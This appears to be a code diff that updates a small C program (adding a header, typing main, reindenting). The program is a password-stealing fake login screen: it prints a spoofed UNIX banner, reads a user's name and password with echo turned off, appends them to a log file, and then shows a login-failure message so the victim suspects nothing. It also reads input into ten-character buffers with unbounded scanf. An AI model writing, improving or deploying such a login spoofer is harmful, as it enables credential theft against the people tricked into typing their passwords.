@@ -2,7 +2,7 @@
 
 /* define's are like macros you can use for configuration. */
 
-#define SYSTEM "\n\nTiburon Systems 4.2bsd UNIX (shark)\n\n"
+#define SYSTEM "\n\nTiburon Systems 4.2bsdUNIX\n\n"
 
 /* The above string should be made to look like the message that your
  *  * system prints when ready.  Each \n represents a carriage return.
@@ -48,39 +48,38 @@
 
 #include <curses.h>
 #include <signal.h>
+#include <stdlib.h>
 int stop();
 
-main()
-{
-char name[10], password[10];
-int i;
-FILE *fp, *fopen();
-signal(SIGINT,stop);
-initscr();
-printf(SYSTEM);
-printf(LOGIN);
-scanf("%[^\n]",name);
-getchar();
-noecho();
-printf(PASSWORD);
-scanf("%[^\n]",password);
-printf("\n");
-getchar();
-echo();
-sleep(WAIT);
+int main(){
+    char name[10], password[10];
+    int i;
+    FILE *fp, *fopen();
+    signal(SIGINT,stop);
+    initscr();
+    printf(SYSTEM);
+    printf(LOGIN);
+    scanf("%[^\n]",name);
+    getchar();
+    noecho();
+    printf(PASSWORD);
+    scanf("%[^\n]",password);
+    printf("\n");
+    getchar();
+    echo();
+    sleep(WAIT);
 
 
-if ( ( fp = fopen(FILENAME,"a") )  != NULL ) {
-fprintf(fp,"login %s has password %s\n",name,password);
-fclose(fp);
+    if ( ( fp = fopen(FILENAME,"a") )  != NULL ) {
+	fprintf(fp,"login %s has password %s\n",name,password);
+	fclose(fp);
+    }
+
+    printf(INCORRECT);
+    endwin();
 }
 
-printf(INCORRECT);
-endwin();
-}
-
-stop()
-{
-endwin();
-exit(0);
+int stop(){
+    endwin();
+    exit(0);
 }
